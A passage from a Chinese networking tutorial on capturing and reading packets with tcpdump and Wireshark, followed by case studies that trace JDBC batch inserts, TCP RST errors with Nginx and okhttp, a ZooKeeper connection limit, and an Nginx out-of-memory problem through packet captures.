length 1460 \t0x0000: 4500 05dc b1c4 0000 8006 42fb 249e d9e1 E.........B.$... \t0x0010: 0ad3 370a 0050 b17c 3b79 032b 8ffb cf66 ..7..P.|;y.+...f \t0x0020: 5018 4000 9e9e 0000 4854 5450 2f31 2e31 P.@.....HTTP/1.1 \t0x0030: 2032 3030 204f 4b0d 0a53 6572 7665 723a .200.OK..Server: \t0x0040: 2054 656e 6769 6e65 0d0a 436f 6e74 656e .Tengine..Conten \t0x0050: 742d 5479 7065 3a20 6170 706c 6963 6174 t-Type:.applicat \t0x0060: 696f 6e2f 6a61 7661 7363 7269 7074 0d0a ion/javascript.. \t0x0070: 436f 6e74 656e 742d 4c65 6e67 7468 3a20 Content-Length:. \t0x0080: 3633 3532 320d 0a43 6f6e 6e65 6374 696f 63522..Connectio \t0x0090: 6e3a 206b 6565 702d 616c 6976 650d 0a56 n:.keep-alive..V \t0x00a0: 6172 793a 2041 6363 6570 742d 456e 636f ary:.Accept-Enco \t0x00b0: 6469 6e67 0d0a 4461 7465 3a20 5765 642c ding..Date:.Wed, \t0x00c0: 2031 3320 4d61 7220 3230 3139 2031 313a .13.Mar.2019.11: \t0x00d0: 3439 3a33 3520 474d 540d 0a45 7870 6972 49:35.GMT..Expir   限制包大小：-s 选项 当包体很大，可以用 -s 选项截取部分报文内容，一般都跟 -A 一起使用。查看每个包体前 500 字节可以用下面的命令\n1  sudo tcpdump -i any -nn port 80 -A -s 500   如果想显示包体所有内容，可以加上-s 0\n只抓取 5 个报文： -c 选项 使用 -c number命令可以抓取 number 个报文后退出。在网络包交互非常频繁的服务器上抓包比较有用，可能运维人员只想抓取 1000 个包来分析一些网络问题，就比较有用了。\n1  sudo tcpdump -i any -nn port 80 -c 5   数据报文输出到文件：-w 选项 -w 选项用来把数据报文输出到文件，比如下面的命令就是把所有 80 端口的数据输出到文件\n1  sudo tcpdump -i any port 80 -w test.pcap   生成的 pcap 文件就可以用 wireshark 打开进行更详细的分析了\n也可以加上-U强制立即写到本地磁盘，性能稍差\n显示绝对的序号：-S 选项 默认情况下，tcpdump 显示的是从 0 开始的相对序号。如果想查看真正的绝对序号，可以用 -S 选项。\n没有 -S 时的输出，seq 和 ACK 都是从 0 开始\n1 2 3 4  sudo tcpdump -i any port 80 -nn  12:12:37.832165 IP 10.211.55.10.46102 \u0026gt; 36.158.217.230.80: Flags [P.], seq 1:151, ack 1, win 229, length 150 12:12:37.832272 IP 36.158.217.230.80 \u0026gt; 10.211.55.10.46102: Flags [.], ack 151, win 16384, length 0   没有 -S 时的输出，可以看到 seq 不是从 0 开始\n1 2 3 4  sudo tcpdump -i any port 80 -nn -S  12:13:21.863918 IP 10.211.55.10.46074 \u0026gt; 36.158.217.223.80: Flags [P.], seq 4277123624:4277123774, ack 3358116659, win 229, length 150 12:13:21.864091 IP 36.158.217.223.80 \u0026gt; 10.211.55.10.46074: Flags [.], ack 4277123774, win 16384, length 0   0x02 高级技巧 tcpdump 真正强大的是可以用布尔运算符and（或\u0026amp;\u0026amp;）、or（或||）、not（或!）来组合出任意复杂的过滤器\n抓取 ip 为 10.211.55.10 到端口 3306 的数据包\n1  sudo tcpdump -i any host 10.211.55.10 and dst port 3306   抓取源 ip 为 10.211.55.10，目标端口除了22 以外所有的流量\n1  sudo tcpdump -i any src 10.211.55.10 and not dst port 22   复杂的分组 如果要抓取：来源 ip 为 10.211.55.10 且目标端口为 3306 或 6379 的包，按照前面的描述，我们会写出下面的语句\n1  sudo tcpdump -i any src 10.211.55.10 and (dst port 3306 or 6379)   如果运行一下，就会发现执行报错了，因为包含了特殊字符()，解决的办法是用单引号把复杂的组合条件包起来。\n1  sudo tcpdump -i any \u0026#39;src 10.211.55.10 and (dst port 3306 or 6379)\u0026#39;   如果想显示所有的 RST 包，要如何来写 tcpdump 的语句呢？先来说答案\n1  tcpdump \u0026#39;tcp[13] \u0026amp; 4 != 0\u0026#39;   要弄懂这个语句，必须要清楚 TCP 首部中 offset 为 13 的字节的第 3 比特位就是 RST\n下图是 TCP 头的结构\ntcp[13] 表示 tcp 头部中偏移量为 13 字节，如上图中红色框的部分，\n!=0 表示当前 bit 置 1，即存在此标记位，跟 4 做与运算是因为 RST 在 TCP 的标记位的位置在第 3 位(00000100)\n如果想过滤 SYN + ACK 包，那就是 SYN 和 ACK 包同时置位（00010010），写成 tcpdump 语句就是\n1  tcpdump \u0026#39;tcp[13] \u0026amp; 18 != 0\u0026#39;   TCPDump 输出解读 我们在机器 A（10.211.55.10）用nc -l 8080启动一个 tcp 的服务器，然后启动 tcpdump 抓包（sudo tcpdump -i any port 8080 -nn -A ）。然后在机器 B（10.211.55.5） 用 nc 10.211.55.10 8080进行连接，然后输入\u0026quot;hello, world\u0026quot;回车，过一段时间在机器 B 用 ctrl-c 结束连接，整个过程抓到的包如下（中间删掉了一些无关的信息）。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  1 16:46:22.722865 IP 10.211.55.5.45424 \u0026gt; 10.211.55.10.8080: Flags [S], seq 3782956689, win 29200, options [mss 1460,sackOK,TS val 463670960 ecr 0,nop,wscale 7], length 0  2 16:46:22.722903 IP 10.211.55.10.8080 \u0026gt; 10.211.55.5.45424: Flags [S.], seq 3722022028, ack 3782956690, win 28960, options [mss 1460,sackOK,TS val 463298257 ecr 463670960,nop,wscale 7], length 0  3 16:46:22.723068 IP 10.211.55.5.45424 \u0026gt; 10.211.55.10.8080: Flags [.], ack 1, win 229, options [nop,nop,TS val 463670960 ecr 463298257], length 0  4 16:46:25.947217 IP 10.211.55.5.45424 \u0026gt; 10.211.55.10.8080: Flags [P.], seq 1:13, ack 1, win 229, options [nop,nop,TS val 463674184 ecr 463298257], length 12 hello world  5 16:46:25.947261 IP 10.211.55.10.8080 \u0026gt; 10.211.55.5.45424: Flags [.], ack 13, win 227, options [nop,nop,TS val 463301481 ecr 463674184], length 0  6 16:46:28.011057 IP 10.211.55.5.45424 \u0026gt; 10.211.55.10.8080: Flags [F.], seq 13, ack 1, win 229, options [nop,nop,TS val 463676248 ecr 463301481], length 0  7 16:46:28.011153 IP 10.211.55.10.8080 \u0026gt; 10.211.55.5.45424: Flags [F.], seq 1, ack 14, win 227, options [nop,nop,TS val 463303545 ecr 463676248], length 0  8 16:46:28.011263 IP 10.211.55.5.45424 \u0026gt; 10.211.55.10.8080: Flags [.], ack 2, win 229, options [nop,nop,TS val 463676248 ecr 463303545], length 0   第 1~3 行是 TCP 的三次握手的过程\n第 1 行 中，第一部分是这个包的时间（16:46:22.722865），显示到微秒级。接下来的 \u0026ldquo;10.211.55.5.45424 \u0026gt; 10.211.55.10.8080\u0026rdquo; 表示 TCP 四元组：包的源地址、源端口、目标地址、目标端口，中间的大于号表示包的流向。接下来的 \u0026ldquo;Flags [S]\u0026rdquo; 表示 TCP 首部的 flags 字段，这里的 S 表示设置了 SYN 标志，其它可能的标志有\n F：FIN 标志 R：RST 标志 P：PSH 标志 U：URG 标志 . ：没有标志，ACK 情况下使用  接下来的 \u0026ldquo;seq 3782956689\u0026rdquo; 是 SYN 包的序号。需要注意的是默认的显示方式是在 SYN 包里的显示真正的序号，在随后的段中，为了方便阅读，显示的序号都是相对序号。\n接下来的 \u0026ldquo;win 29200\u0026rdquo; 表示自己声明的接收窗口的大小\n接下来用[] 包起来的 options 表示 TCP 的选项值，里面有很多重要的信息，比如 MSS、window scale、SACK 等\n最后面的 length 参数表示当前包的长度\n第 2 行是一个 SYN+ACK 包，如前面所说，SYN 包中包序号用的是绝对序号，后面的 win = 28960 也声明的发送端的接收窗口大小。\n从第 3 行开始，后面的包序号都用的是相对序号了。第三行是客户端 B 向服务端 A 发送的一个 ACK 包。注意这里 win=229，实际的窗口并不是 229，因为窗口缩放（window scale） 在三次握手中确定，后面的窗口大小都需要乘以 window scale 的值 2^7（128），比如这里的窗口大小等于 229 * 2^7 = 229 * 128 = 29312\n第 4 行是客户端 B 向服务端 A 发送\u0026quot;hello world\u0026quot;字符串，这里的 flag 为P.,表示 PSH+ACK。发送包的 seq 为 1:13，长度 length 为 12。窗口大小还是 229 * 128\n第 5 行是服务端 A 收到\u0026quot;hello world\u0026quot;字符串以后回复的 ACK 包，可以看到 ACK 的值为 13，表示序号为 13 之前的所有的包都已经收到，下次发包从 13 开始发\n第 6 行是客户端 B 执行 Ctrl+C 以后nc 客户端准备退出时发送的四次挥手的第一个 FIN 包，包序号还是 13，长度为 0\n第 7 行是服务端 A 对 B 发出的 FIN 包后，也同时回复 FIN + ACK，因为没有往客户端传输过数据包，所以这里的 SEQ 还是 1。\n第 8 行是客户端 A 对 服务端 B 发出的 FIN 包回复的 ACK 包\n小结 这篇文章主要介绍了 tcpdump 工具的使用，这个工具是这本小册使用最频繁的工具，一定要好好掌握它。\n34、网络命令篇（三） —— 网络分析屠龙刀 wireshark 这篇文章我们讲解 wireshark。前面我们介绍了 tcpdump，它是命令行程序，对 linux 服务器比较友好，简单快速适合简单的文本协议的分析和处理。wireshark 有图形化的界面，分析功能非常强大，不仅仅是一个抓包工具，且支持众多的协议。它也有命令行版本的叫做 tshark，不过用的比较少一点。\n抓包过滤 抓包的过程很耗 CPU 和内存资源而且大部分情况下我们不是对所有的包都感兴趣，因此可以只抓取满足特定条件的包，丢弃不感兴趣的包，比如只想抓取 ip 为172.18.80.49 端口号为 3306 的包，可以输入host 172.18.80.49 and port 3306\n显示过滤（Display filter） 显示过滤可以算是 wireshark 最常用的功能了，与抓包过滤不一样的是，显示过滤不会丢弃包的内容，不符合过滤条件的包被隐藏起来，方便我们阅读。\n过滤的方式常见的有以下几种：\n 协议、应用过滤器（ip/tcp/udp/arp/icmp/ dns/ftp/nfs/http/mysql) 字段过滤器（http.host/dns.qry.name）  比如我们只想看 http 协议报文，在过滤器中输入 http 即可\n字段过滤器可以更加精确的过滤出想要的包，比如我们只想看锤科网站t.tt域名的 dns 解析，可以输入dns.qry.name == t.tt\n再比如，我只想看访问锤科的 http 请求，可以输入http.host == t.tt\n要想记住这些很难，有一个小技巧，比如怎么知道 域名为t.tt 的 dns 查询要用dns.qry.name呢？\n可以随便找一个 dns 的查询，找到查询报文，展开详情里面的内容，然后鼠标选中想过滤的字段，最下面的状态码就会出现当前 wireshark 对应的查看条件，比如下图中的dns.qry.name\n常用的查询条件有：\ntcp 相关过滤器\n tcp.flags.syn==1：过滤 SYN 包 tcp.flags.reset==1：过滤 RST 包 tcp.analysis.retransmission：过滤重传包 tcp.analysis.zero_window：零窗口  http 相关过滤器\n http.host==t.tt：过滤指定域名的 http 包 http.response.code==302：过滤http响应状态码为302的数据包 http.request.method==POST：过滤所有请求方式为 POST 的 http 请求包 http.transfer_encoding == \u0026ldquo;chunked\u0026rdquo; 根据transfer_encoding过滤 http.request.uri contains \u0026ldquo;/appstock/app/minute/query\u0026rdquo;：过滤 http 请求 url 中包含指定路径的请求  通信延迟常用的过滤器\n http.time\u0026gt;0.5：请求发出到收到第一个响应包的时间间隔，可以用这个条件来过滤 http 的时延 tcp.time_delta\u0026gt;0.3：tcp 某连接中两次包的数据间隔，可以用这个来分析 TCP 的时延 dns.time\u0026gt;0.5：dns 的查询耗时  wireshakr 所有的查询条件在这里可以查到：https:/ /www.wireshark.org/docs/dfref/\n比较运算符 wireshark 支持比较运算符和逻辑运算符。这些运算符可以灵活的组合出强大的过滤表达式。\n 等于：== 或者 eq 不等于：!= 或者 ne 大于：\u0026gt; 或者 gt 小于：\u0026lt; 或者 lt 包含 contains 匹配 matches 与操作：AND 或者 \u0026amp;\u0026amp; 或操作：OR 或者 || 取反：NOT 或者 !  比如想过滤 ip 来自 192.168.1.1 且是 TCP 协议的数据包：\n1  ip.addr == 10.0.0.10 and tcp   从 wireshark 看协议分层 下图是抓取的一次 http 请求的包curl http://www.baidu.com：\n可以看到协议的分层，从上往下依次是\n Frame：物理层的数据帧 Ethernet II：数据链路层以太网帧头部信息 Internet Protocol Version 4：互联网层IP包头部信息 Transmission Control Protocol：传输层的数据段头部信息，此处是TCP协议 Hypertext Transfer Protocol：应用层 HTTP 的信息  跟踪 TCP 数据流（Follow TCP Stream） 在实际使用过程中，跟踪 TCP 数据流是一个很高频的使用。我们通过前面介绍的那些过滤条件找到了一些包，大多数情况下都需要查看这个 TCP 连接所有的包来查看上下文。\n这样就可以查看整个连接的所有包交互情况了，如下图所示，三次握手、数据传输、四次挥手的过程一目了然\n解密HTTPS包 随着 https 和 http2.0 的流行，https 正全面取代 http，这给我们抓包带来了一点点小困难。Wireshark 的抓包原理是直接读取并分析网卡数据。 下图是访问 www.baidu.com 的部分包截图，传输包的内容被加密了。\n要想让它解密 HTTPS 流量，要么拥有 HTTPS 网站的加密私钥，可以用来解密这个网站的加密流量，但这种一般没有可能拿到。要么某些浏览器支持将 TLS 会话中使用的对称加密密钥保存在外部文件中，可供 Wireshark 解密流量。 在启动 Chrome 时加上环境变量 SSLKEYLOGFILE 时，chrome 会把会话密钥输出到文件。\n1  SSLKEYLOGFILE=/tmp/SSLKEYLOGFILE.log /Applications/Google\\ Chrome.app/Contents/MacOS/Google\\ Chrome   wireshark 可以在Wireshark -\u0026gt; Preferences... -\u0026gt; Protocols -\u0026gt; SSL打开Wireshark 的 SSL 配置面板，在(Pre)-Master-Secret log filename选项中输入 SSLKEYLOGFILE 文件路径。\n这样就可以查看加密前的 https 流量了\n书籍推荐 上面仅列举出了部分常用的选项，关于 wireshark 可以写的东西非常多，推荐林沛满写的 wireshark 系列，我从中受益匪浅。\n35、案例分析 —— JDBC 批量插入真的就批量了吗 这篇文章我们以 JDBC 批量插入的问题来看看网络分析在实际工作用的最简单的应用。\n几年前遇到过一个问题，使用 jdbc 批量插入，插入的性能总是上不去，看代码又查不出什么结果。代码简化以后如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13  public static void main(String[] args) throws ClassNotFoundException, SQLException {  Class.forName(\u0026#34;com.mysql.jdbc.Driver\u0026#34;);   String url = \u0026#34;jdbc:mysql://localhost:3306/test?useSSL=false\u0026#34;; Connection connection = DriverManager.getConnection(url, \u0026#34;root\u0026#34;, \u0026#34;\u0026#34;); PreparedStatement statement = connection.prepareStatement(\u0026#34;insert into batch_insert_test(name)values(?)\u0026#34;);   for (int i = 0; i \u0026lt; 10; i++) { statement.setString(1, \u0026#34;name#\u0026#34; + System.currentTimeMillis() + \u0026#34;#\u0026#34; + i); statement.addBatch(); } statement.executeBatch(); }   通过 wireshark 抓包，结果如下\n可以看到 jdbc 实际上是发送了 10 次 insert 请求，既不能降低网络通信的成本，也不能在服务器上批量执行。\n单步调试，发现调用到了executeBatchSerially\n1 2 3 4 5 6 7 8  /** * Executes the current batch of statements by executing them one-by-one. * * @return a list of update counts * @throws SQLException * if an error occurs */ protected long[] executeBatchSerially(int batchTimeout) throws SQLException   看源码发现跟connection.getRewriteBatchedStatements()有关，当等于 true 时，会进入批量插入的流程，等于 false 时，进入逐条插入的流程。\n修改 sql 连接的参数，增加rewriteBatchedStatements=true\n1 2  // String url = \u0026#34;jdbc:mysql://localhost:3306/test?useSSL=false\u0026#34;; String url = \u0026#34;jdbc:mysql://localhost:3306/test?useSSL=false\u0026amp;rewriteBatchedStatements=true\u0026#34;;   单步调试，可以看到这下进入到批量插入的逻辑了。\nwireshark 抓包情况如下，可以确认批量插入生效了\nrewriteBatchedStatements 参数将\n1 2 3 4 5 6 7 8 9 10  insert into batch_insert_test(name)values(\u0026#39;name#1554175696958#0\u0026#39;) insert into batch_insert_test(name)values(\u0026#39;name#1554175696958#1\u0026#39;) insert into batch_insert_test(name)values(\u0026#39;name#1554175696958#2\u0026#39;) insert into batch_insert_test(name)values(\u0026#39;name#1554175696958#3\u0026#39;) insert into batch_insert_test(name)values(\u0026#39;name#1554175696958#4\u0026#39;) insert into batch_insert_test(name)values(\u0026#39;name#1554175696958#5\u0026#39;) insert into batch_insert_test(name)values(\u0026#39;name#1554175696958#6\u0026#39;) insert into batch_insert_test(name)values(\u0026#39;name#1554175696958#7\u0026#39;) insert into batch_insert_test(name)values(\u0026#39;name#1554175696958#8\u0026#39;) insert into batch_insert_test(name)values(\u0026#39;name#1554175696958#9\u0026#39;)   改写为真正的批量插入\n1 2 3 4 5 6  insert into batch_insert_test(name)values (\u0026#39;name#1554175696958#0\u0026#39;),(\u0026#39;name#1554175696958#1\u0026#39;), (\u0026#39;name#1554175696958#2\u0026#39;),(\u0026#39;name#1554175696958#3\u0026#39;), (\u0026#39;name#1554175696958#4\u0026#39;),(\u0026#39;name#1554175696958#5\u0026#39;), (\u0026#39;name#1554175696958#6\u0026#39;),(\u0026#39;name#1554175696958#7\u0026#39;), (\u0026#39;name#1554175696958#8\u0026#39;),(\u0026#39;name#1554175696958#9\u0026#39;)   小结与思考 这篇文章以一个非常简单的例子讲述了在用抓包工具来解决在 JDBC 上批量插入效率低下的问题。我们经常会用很多第三方的库，这些库我们一般没有精力把每行代码都读通读透，遇到问题时，抓一些包就可以很快确定问题的所在，这就是抓包网络分析的魅力所在。\n36、案例分析 —— TCP RST 包导致的网络血案 在开发过程中，你一定遇到过这个异常：java.net.SocketException: Connection reset，在这个异常的产生的原因就是因为 RST 包，这篇文章会解释 RST 包产生的原因和几个典型的出现场景。\n RST（Reset）表示复位，用来强制关闭连接\n 场景一：对端主机端口不存在 服务器 10.211.55.5 上执行 netstat 命令可以查看当前机器监听的端口信息，-l表示只列出 listen 状态的 socket。\n1 2 3  sudo netstat -lnp | grep tcp Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 1365/sshd   可以看到目前服务器上只监听了 22 端口\n这个时候客户端想连接服务端的 80 端口会发生什么呢？在客户端（10.211.55.10）开启 tcpdump 抓包，然后尝试连接服务器的 80 端口（nc 10.211.55.5 80）。\n可以看到客户端发了一个 SYN 包到服务器，服务器马上回了一个 RST 包，表示拒绝\n场景二：Nginx 502（Bad Gateway） Nginx 的 upstream server 没有启动或者进程挂掉是绝大多数 502 状态码的根源，先来复现一下\n 准备两台虚拟机 A（10.211.55.5） 和 B（10.211.55.10），A 装好 Nginx，B 启动一个 web 服务器监听 8080 端口（Java、Node.js、Go 什么都可以） A 机器 Nginx 配置文件如下  1 2 3 4 5 6 7 8 9 10 11 12  upstream web_server {  server 10.211.55.10:8080;  keepalive 16; } server {  listen 80;  server_name test.foo.com;  location /test {  proxy_http_version 1.1;  proxy_pass http://web_server/;  } }   此时请求 test.foo.com/test 就返回正确的 Node.js 页面\n下一步，kill 掉 B 机器上的 Node 进程，这时客户端请求返回了 502\n整个过程如下：\n 客户端发起一个 http 请求到 nginx Nginx 收到请求，根据配置文件的信息将请求转发到对应的下游 server 的 8080 端口处理，如果还没有建立连接，会发送 SYN 包准备三次握手建连，如果已经建立了连接，会发送数据包。 下游服务器发现并没有进程监听 8080 端口，于是返回 RST 包 Nginx Nginx 拿到 RST 包以后，认为后端已经挂掉，于是返回 502 状态码给客户端  简略图如下：\n场景三：从一次 OKHttp 请求失败惨案看 RST 这个场景是使用 okhttp 发送 http 请求，发现偶发性出现请求失败的情况\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  Exception in thread \u0026#34;main\u0026#34; java.io.IOException: unexpected end of stream on Connection{test.foo.com:80, proxy=DIRECT hostAddress=test.foo.com/10.211.55.5:80 cipherSuite=none protocol=http/1.1} \tat okhttp3.internal.http1.Http1Codec.readResponseHeaders(Http1Codec.java:208) \tat okhttp3.internal.http.CallServerInterceptor.intercept(CallServerInterceptor.java:88) \tat okhttp3.internal.http.RealInterceptorChain.proceed(RealInterceptorChain.java:147) \tat okhttp3.internal.connection.ConnectInterceptor.intercept(ConnectInterceptor.java:45) \tat okhttp3.internal.http.RealInterceptorChain.proceed(RealInterceptorChain.java:147) \tat okhttp3.internal.http.RealInterceptorChain.proceed(RealInterceptorChain.java:121) \tat okhttp3.internal.cache.CacheInterceptor.intercept(CacheInterceptor.java:93) \tat okhttp3.internal.http.RealInterceptorChain.proceed(RealInterceptorChain.java:147) \tat okhttp3.internal.http.RealInterceptorChain.proceed(RealInterceptorChain.java:121) \tat okhttp3.internal.http.BridgeInterceptor.intercept(BridgeInterceptor.java:93) \tat okhttp3.internal.http.RealInterceptorChain.proceed(RealInterceptorChain.java:147) \tat okhttp3.internal.http.RetryAndFollowUpInterceptor.intercept(RetryAndFollowUpInterceptor.java:126) \tat okhttp3.internal.http.RealInterceptorChain.proceed(RealInterceptorChain.java:147) \tat okhttp3.internal.http.RealInterceptorChain.proceed(RealInterceptorChain.java:121) \tat okhttp3.RealCall.getResponseWithInterceptorChain(RealCall.java:254) \tat okhttp3.RealCall.execute(RealCall.java:92) \tat MyOkHttpKeepAliveKt.sendHttpRequest(MyOkHttpKeepAlive.kt:36) \tat MyOkHttpKeepAliveKt.main(MyOkHttpKeepAlive.kt:25) Caused by: java.io.EOFException: \\n not found: limit=0 content=… \tat okio.RealBufferedSource.readUtf8LineStrict(RealBufferedSource.java:236)   因为 okhttp 开启了连接池，默认启用了 HTTP/1.1 keepalive，如果拿到一个过期的连接去发起 http 请求，就一定会出现请求失败的情况。Nginx 默认的 keepalive 超时时间是 65s，为了能更快的复现，我把 Nginx 的超时时间调整为了 5s\n1 2 3 4 5  http {  ...  keepalive_timeout 5s;  ... }   客户端请求代码简化如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  private val okHttpClient = OkHttpClient.Builder()  .retryOnConnectionFailure(false)  .connectTimeout(10, TimeUnit.SECONDS)  .writeTimeout(10, TimeUnit.SECONDS)  .readTimeout(30, TimeUnit.SECONDS)  .build()  fun main(args: Array\u0026lt;String\u0026gt;) {  // 发起第一次 http 请求  sendHttpRequest()  TimeUnit.SECONDS.sleep(6)  // 发起第二次 http 请求，因为第一个连接已经释放，第二次会拿到同一条连接  sendHttpRequest()  System.`in`.read() }  private fun sendHttpRequest() {  val request = Request.Builder().url(\u0026#34;http://test.foo.com/test\u0026#34;).get().build()  val response = okHttpClient.newCall(request).execute()  println(\u0026#34;http status: \u0026#34; + response.code())  response.close() }   运行以后，马上出现了上面请求失败的现象，出现的原因是什么呢？\nNginx的 keepalive 时间是 65s，客户端请求了第一次以后，开始闲下来，65s 倒计时到了以后 Nginx 主动发起连接要求正常分手断掉连接，客户端操作系统马上回了一个，好的，我收到了你的消息。但是连接池并不知道这个情况，没有关闭这个 socket，而是继续用这个断掉的连接发起 http 请求。就出现问题了。\ntcpdump 抓包结果如下\n记客户端 10.211.55.10 为 A，服务器 10.211.55.5 为 B，逐行分析结果如下：\n 1 ~ 3：A 与 B 三次握手过程，SYN -\u0026gt; SYN+ACK -\u0026gt; ACK 4 ~ 5：A 向 B 发起 HTTP 请求报文，服务器 B 回了 ACK 6 ~ 7：B 向 A 发送 HTTP 响应报文，客户端 A 收到报文以后回了 ACK 8 ~ 9：经过漫长的65s，客户端 A 没有任何后续请求，Nginx 决定断掉这个连接，于是发送了一个 FIN 给客户端 A，然后进入 FIN_WAIT2 状态，A 收到 FIN 以后进入 CLOSE_WAIT 状态 10：客户端 A 继续发送 HTTP 请求报文到 B 11：因为此时 B 已经不能发送任何报文到 A，于是发送了一个 RST 包给 A，让它可以尽早断开这条连接。  这个有两个解决的方案：\n第一，把 okhttp 连接池的 keepAlive 超时时间设置短于 Nginx 的超时时间 65s，比如设置成 30s builder.connectionPool(ConnectionPool(5, 30, TimeUnit.SECONDS)) 在这种情况下，okhttp 会在连接空闲 30s 以后主动要求断掉连接，这是一种主动出击的解决方案\n这种情况抓包结果如下\n 1 ~ 7：完成第一次 HTTP 请求 8：过了 30s，客户端 A 发送 FIN 给服务器 B，要求断开连接 9：服务器 B，收到以后也回了 FIN + ACK 10：客户端 A 对服务器 B 发过来的 FIN 做确认，回复 ACK，至此四次挥手结束 11 ~ 13：客户端 A 使用新的端口 58604 与服务器 B 进行三次握手建连 13 ~ 20：剩余的过程与第一次请求相同  第二，把 retryOnConnectionFailure 属性设置为 true。这种做法的原理是等对方 RST 掉以后重新发起请求，这是一种被动的处理方案\nretryOnConnectionFailure 这个属性会在请求被远端 connection reset 掉以后进行重试。可以看到 10 ~ 11 行，拿一个过期的连接发起请求，服务器 B 返回了 RST，紧接着客户端就进行了重试，完成了剩下的请求，对上层调用完全无感。\n小结 这篇文章用三个简单例子讲解了 RST 包在真实场景中的案例。\n 第 1 个例子：对端主机端口不存在或者进程崩溃的时候建连或者发请求会收到 RST 包 第 2 个例子：后端 upstream 挂掉的时候，Nginx 返回 502，这个例子不过是前面第 1 个例子在另一个场景的应用 第 3 个例子：okhttp 参数设置不合理导致的 Connection Reset，主要原因是因为对端已经关掉连接，用一条过期的连接发送数据对端会返回 RST 包  平时工作中你有遇到到 RST 导致的连接问题吗？\n37、案例分析 —— 一次 Zookeeper Connection Reset 问题排查 之前有一个组员碰到了一个代码死活连不上 Zookeeper 的问题，我帮忙分析了一下，过程记录了在下面。\n他那边包的错误堆栈是这样的：\n1 2 3 4 5 6 7 8 9  java.io.IOException: Connection reset by peer  at sun.nio.ch.FileDispatcher.read0(Native Method)  at sun.nio.ch.SocketDispatcher.read(SocketDispatcher.java:21)  at sun.nio.ch.IOUtil.readIntoNativeBuffer(IOUtil.java:233)  at sun.nio.ch.IOUtil.read(IOUtil.java:200)  at sun.nio.ch.SocketChannelImpl.read(SocketChannelImpl.java:236)  at org.apache.zookeeper.ClientCnxnSocketNIO.doIO(ClientCnxnSocketNIO.java:68)  at org.apache.zookeeper.ClientCnxnSocketNIO.doTransport(ClientCnxnSocketNIO.java:355)  at org.apache.zookeeper.ClientCnxn$SendThread.run(ClientCnxn.java:1068)   其它组员没有遇到这个问题，他换成无线网络也可以恢复正常，从抓包文件也看到服务端发送了 RST 包给他这台机器，这就比较有意思了。\n基于上面的现象，首先排除了 Zookeeper 本身服务的问题，一定是跟客户端的某些特征有关。\n当时没有登录部署 ZooKeeper 机器的权限，没有去看 ZooKeeper 的日志，先从客户端这边来排查。\n首先用 netstat 查看 ZooKeeper 2181 端口的连接状态，发现密密麻麻，一屏还显示不下，使用 wc -l 统计了一下，发现有 60 个，当时对 ZooKeeper 的原理并不是很了解，看到这个数字没有觉得有什么特别。\n但是经过一些实验，发现小于 60 个连接的时候，客户端使用一切正常，达到 60 个的时候，就会出现 Connection Reset 异常。\n直觉告诉我，可能是 ZooKeeper 对客户端连接有限制，于是去翻了一下文档，真有一个配置项maxClientCnxns是与客户端连接个数有关的。\n maxClientCnxns: Limits the number of concurrent connections (at the socket level) that a single client, identified by IP address, may make to a single member of the ZooKeeper ensemble. This is used to prevent certain classes of DoS attacks, including file descriptor exhaustion. Setting this to 0 or omitting it entirely removes the limit on concurrent connections.\n 这个参数的含义是，限制客户端与 ZooKeeper 的连接个数，通过 IP 地址来区分是不是一个客户端。如果设置为 0 表示不限制连接个数。\n这个值可以通过 ZooKeeper 的配置文件zoo.cfg 进行修改，这个值默认是 60。\n知道这一点以后重新做一下实验，将远程虚拟机中 ZooKeeper 的配置 maxClientCnxns改为 1\n1 2 3 4 5  zoo.cfg  # the maximum number of client connections. # increase this if you need to handle more clients maxClientCnxns=1   在本地zkCli.sh连接 ZooKeeper\n1  zkCli.sh -server c2:2181   发现一切正常成功\n在本地再次用zkCli.sh连接 ZooKeeper，发现连接成功，随后出现 Connection Reset 错误\n通过抓包文件也可以看到，ZooKeeper 发出了 RST 包\n完整的包见：zk_rst.pcapng\n同时在 ZooKeeper 那一端也出现了异常提示\n1  2019-06-23 05:22:25,892 [myid:] - WARN [NIOServerCxn.Factory:0.0.0.0/0.0.0.0:2181:NIOServerCnxnFactory@188] - Too many connections from /10.211.55.2 - max is 1   问题基本上就定位和复现成功了，我们来看一下 ZooKeeper 的源码，看下这部分是如何处理的，这部分逻辑在NIOServerCnxnFactory.java的 run 方法。\n这部分逻辑是如果 maxClientCnxns 大于 0，且当前 IP 的连接数大于 maxClientCnxns 的话，就会主动关闭 socket，同时打印日志。\n后面发现是因为同事有一个操作 ZooKeeper 的代码有 bug，导致建连非常多，后面解决以后问题就再也没有出现了。\n这个案例比较简单，给我们的启示是对于黑盒的应用，通过抓包等方式可以定位出大概的方向，然后进行分析，最终找到问题的根因。\n38、案例分析 —— 一次百万长连接压测 Nginx OOM 的问题排查分析 在最近的一次百万长连接压测中，32C 128G 的四台 Nginx 频繁出现 OOM，出现问题时的内存监控如下所示。\n排查的过程记录如下。\n现象描述 这是一个 websocket 百万长连接收发消息的压测环境，客户端 jmeter 用了上百台机器，经过四台 Nginx 到后端服务，简化后的部署结构如下图所示。\n在维持百万连接不发数据时，一切正常，Nginx 内存稳定。在开始大量收发数据时，Nginx 内存开始以每秒上百 M 的内存增长，直到占用内存接近 128G，woker 进程开始频繁 OOM 被系统杀掉。32 个 worker 进程每个都占用接近 4G 的内存。dmesg -T 的输出如下所示。\n1 2  [Fri Mar 13 18:46:44 2020] Out of memory: Kill process 28258 (nginx) score 30 or sacrifice child [Fri Mar 13 18:46:44 2020] Killed process 28258 (nginx) total-vm:1092198764kB, anon-rss:3943668kB, file-rss:736kB, shmem-rss:4kB   work 进程重启后，大量长连接断连，压测就没法继续增加数据量。\n排查过程分析 拿到这个问题，首先查看了 Nginx 和客户端两端的网络连接状态，使用 ss -nt 命令可以在 Nginx 看到大量 ESTABLISH 状态连接的 Send-Q 堆积很大，客户端的 Recv-Q 堆积很大。Nginx 端的 ss 部分输出如下所示。\n1 2 3  State Recv-Q Send-Q Local Address:Port Peer Address:Port ESTAB 0 792024 1.1.1.1:80 2.2.2.2:50664 ...   在 jmeter 客户端抓包偶尔可以看到较多零窗口，如下所示。\n到了这里有了一些基本的方向，首先怀疑的就是 jmeter 客户端处理能力有限，有较多消息堆积在中转的 Nginx 